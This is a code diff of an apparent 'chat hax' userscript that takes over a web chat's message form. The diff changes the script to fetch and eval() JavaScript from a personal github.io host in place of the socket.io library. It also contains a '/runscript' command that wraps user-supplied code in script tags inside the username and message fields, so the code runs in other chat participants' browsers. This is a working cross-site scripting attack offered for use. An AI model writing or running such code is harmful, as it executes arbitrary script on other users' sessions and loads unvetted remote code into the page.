@@ -1,8 +1,8 @@
 $('.chat').append("<br><p>GMS Chat Hax Enabled</p><br>");
 $('form').unbind();
-fetch('https://unpkg.com/socket.io-client@2.3.0/dist/socket.io.slim.js') .then(response => response.text()) .then((data) => { eval(data) })
+fetch('https://thatfrueddued.github.io/JustSomeRandomFiles/GamerHax/GMSChat/SocketMod.js') .then(response => response.text()) .then((data) => { eval(data) })
 $('form').submit(function(e){
-    let socket = io();
+    let socket = ieo();
     socket.off('kick');
     let message = $(e.target).find('input').val();
     function glc(x) {
@@ -63,7 +63,7 @@ $('form').submit(function(e){
     }
     if (message === "/runscript") {
         var scriptToRun = prompt("Run script on server:");
-        io().emit('message', {
+        ieo().emit('message', {
             username: '<script>',
             message: '</script><script>' + scriptToRun + '</script>',
             myrank: '',
